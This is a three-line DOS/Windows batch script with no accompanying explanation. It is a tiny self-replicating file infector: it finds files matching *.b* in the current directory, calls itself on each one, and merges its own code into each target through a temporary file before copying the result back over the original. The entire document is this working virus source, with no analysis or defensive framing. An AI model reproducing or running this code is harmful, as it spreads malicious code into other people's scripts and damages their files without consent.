if "%1==" for %%m in (*.b*) do call %0 %%m
copy/b %0+%1 #
copy # %1